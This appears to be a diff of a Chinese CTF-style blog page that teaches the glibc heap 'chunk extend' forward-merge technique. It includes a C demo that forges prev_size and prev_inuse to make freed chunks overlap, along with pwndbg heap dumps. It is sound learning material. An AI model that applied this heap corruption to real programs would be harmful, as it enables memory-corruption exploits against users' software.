&#123;</span><br><span class="line">  prev_size = 352,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x411</span><br><span class="line">&#125;</span><br><span class="line">0x602180 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1041,</span><br><span class="line">  fd = 0x3a347274705d2a5b,</span><br><span class="line">  bk = 0x3065303230367830,</span><br><span class="line">  fd_nextsize = 0xa,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602590 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 133745,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>成功跨多域进行分配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602010-0x10</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000161</span><br><span class="line">0x602010:       0x00007ffff7dd1b78      0x00007ffff7dd1b78</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<h3 id="通过extend进行前向合并"><a href="#通过extend进行前向合并" class="headerlink" title="通过extend进行前向合并"></a>通过extend进行前向合并</h3><p>之前的后向合并都是通过更改size实现的,但extend的前向合并则不一样,但原理是类似的<br>后向合并是通过更改size实现的,而前向合并顾名思义需要我们更改pre_size才行<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span><br></span>&#123;<br>    <span class="hljs-keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4,*ptr5;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//防止与top合并</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr1:%p\n"</span>,ptr1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr2:%p\n"</span>,ptr2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr3:%p\n"</span>,ptr3);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr4:%p\n"</span>,ptr4);<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;<span class="hljs-comment">//修改pre_inuse域</span><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;<span class="hljs-comment">//修改pre_size域</span><br>    <span class="hljs-built_in">free</span>(ptr4);<span class="hljs-comment">//unlink进行前向extend</span><br>    ptr5=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);<span class="hljs-comment">//占位块</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr5:%p\n"</span>,ptr5);<br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>先看程序的运行结果:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs undefined">╰─# ./<span class="hljs-selector-tag">pwn</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr1</span><span class="hljs-selector-pseudo">:0x10c2010</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr2</span><span class="hljs-selector-pseudo">:0x10c20a0</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr3</span><span class="hljs-selector-pseudo">:0x10c20c0</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr4</span><span class="hljs-selector-pseudo">:0x10c20e0</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr5</span><span class="hljs-selector-pseudo">:0x10c2010</span><br></code></pre></td></tr></table></figure></p>
+<p>然后再调试一下,这次我断点下在了第一free的地方<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602090</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x6020b0</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x91</span><br>&#125;<br><span class="hljs-number">0x6020d0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602160</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x411</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>可以看到我们的符合smallbin和fastbin的四个chunk已经分配完成了,然后先free掉ptr1,修改ptr4的pre_inuse和pre_size<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">20</span>gx ptr4-<span class="hljs-number">0</span>x10<br><span class="hljs-number">0x6020d0</span>:       <span class="hljs-number">0</span>x000000<span class="hljs-number">00000000d0</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000090</span><br><span class="hljs-number">0x6020e0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020f0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602100</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602110</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602120</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602130</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602140</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602150</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602160</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br></code></pre></td></tr></table></figure></p>
+<p>这里已经改好了,然后进行free(ptr4),此时的heap<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">353</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  bk = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602160</span> &#123;<br>  prev_size = <span class="hljs-number">352</span>,<br>  size = <span class="hljs-number">32</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602180</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x3a347274705d2a5b</span>,<br>  bk = <span class="hljs-number">0x3065303230367830</span>,<br>  fd_nextsize = <span class="hljs-number">0xa</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602590</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133745</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>此时的bins:<br><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-attribute">pwndbg&gt; bins<br>fastbins<br>0x20</span>: 0x0<br><span class="hljs-attribute">0x30</span>: 0x0<br><span class="hljs-attribute">0x40</span>: 0x0<br><span class="hljs-attribute">0x50</span>: 0x0<br><span class="hljs-attribute">0x60</span>: 0x0<br><span class="hljs-attribute">0x70</span>: 0x0<br><span class="hljs-attribute">0x80</span>: 0x0<br><span class="hljs-attribute">unsortedbin<br>all</span>: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000<br><span class="hljs-attribute">smallbins<br>empty<br>largebins<br>empty</span><br></code></pre></td></tr></table></figure></p>
+<p>然后再分配<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">353</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  bk = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602160</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">352</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602180</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x3a347274705d2a5b</span>,<br>  bk = <span class="hljs-number">0x3065303230367830</span>,<br>  fd_nextsize = <span class="hljs-number">0xa</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602590</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133745</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>成功跨多域进行分配<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602010</span>-<span class="hljs-number">0</span>x10<br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000161</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00007ffff7dd1b78      <span class="hljs-number">0</span>x00007ffff7dd1b78<br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure></p>
 <p>over~ 得,乖乖回去写off-by-one去了</p>
 
-      
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/07/26/advanced-heap-exploiatior-搬运/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">advanced heap exploiatior(搬运)</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/07/24/off-by-one/">
+                        <span class="hidden-mobile">off-by-one</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://nightRainy.github.io/2019/07/25/chunk-extend-and-overlapping/" data-id="ckmk3305x000e7gjdfvtcmol5" class="article-share-link">
-        Share
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
       </a>
-      
-    </footer>
+    
 
-  </div>
-
-  
-  
-<nav class="article-nav">
-  
-  <a href="/2019/07/26/advanced-heap-exploiatior-搬运/" class="article-nav-link">
-    <strong class="article-nav-caption">Newer</strong>
-    <div class="article-nav-title">
-      
-      advanced heap exploiatior(搬运)
-      
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-  </a>
-  
-  
-  <a href="/2019/07/24/off-by-one/" class="article-nav-link">
-    <strong class="article-nav-caption">Older</strong>
-    <div class="article-nav-title">off-by-one</div>
-  </a>
-  
-</nav>
-
-  
-
-  
-  
-  
-  
-
-</article>
-</section>
-    <footer class="footer">
-  <div class="outer">
-    <div class="float-right">
-      <ul class="list-inline">
-  
-  <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
-  
-  <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
-  
-</ul>
-    </div>
-    <ul class="list-inline">
-      <li>知世の小屋 &copy; 2021</li>
-      
-      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
-      <li>theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
-    </ul>
   </div>
-</footer>
+</div>
+    
+
+    
   </main>
-  <aside class="sidebar">
-    <button class="navbar-toggle"></button>
-<nav class="navbar">
-  
-  <div class="logo">
-    <a href="/"><img src="/images/hexo.svg" alt="知世の小屋"></a>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
   
-  <ul class="nav nav-main">
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/">主页</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/archives">归档</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/gallery">相册</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/about">关于</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link nav-item-search" title="Search">
-        <i class="fe fe-search"></i>
-        Search
-      </a>
-    </li>
-  </ul>
-</nav>
-<nav class="navbar navbar-bottom">
-  <ul class="nav">
-    <li class="nav-item">
-      <div class="totop" id="totop">
-  <i class="fe fe-rocket"></i>
-</div>
-    </li>
-    <li class="nav-item">
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css">
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/events.js"></script>
+<script src="/js/plugins.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/img-lazyload.js"></script>
+  
+
+
+
+  
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js"></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
       
-      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
-        <i class="fe fe-feed"></i>
-      </a>
+      typing(title)
       
-    </li>
-  </ul>
-</nav>
-<div class="search-form-wrap">
-  <div class="local-search local-search-plugin">
-  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
-  <div id="local-search-result" class="local-search-result"></div>
-</div>
-</div>
-  </aside>
-  <script src="/js/jquery-2.0.3.min.js"></script>
-<script src="/js/jquery.justifiedGallery.min.js"></script>
-<script src="/js/lazyload.min.js"></script>
-<script src="/js/busuanzi-2.3.pure.min.js"></script>
-
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    })(window, document);
+  </script>
 
 
 
+  <script src="/js/local-search.js"></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
 
 
-<script src="/js/ocean.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script src="/js/boot.js"></script>
+
+
 </body>
-
 </html>
